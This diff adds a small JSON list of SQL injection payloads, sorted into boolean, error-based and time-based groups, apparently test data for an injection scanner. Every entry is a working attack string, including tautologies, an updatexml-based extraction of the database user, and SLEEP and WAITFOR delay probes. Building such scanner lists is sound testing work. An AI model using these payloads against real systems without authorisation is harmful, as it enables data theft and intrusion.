@@ -1,0 +1,21 @@
+{
+  "boolean": [
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "1 OR 1=1",
+    "1' AND '1'='1"
+  ],
+  "error": [
+    "'",
+    "\"",
+    "'))",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "' OR updatexml(1,concat(0x7e,user()),1)-- -"
+  ],
+  "time": [
+    "'; WAITFOR DELAY '0:0:5'--",
+    "1 AND SLEEP(5)",
+    "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
+    "\" OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
+  ]
+}
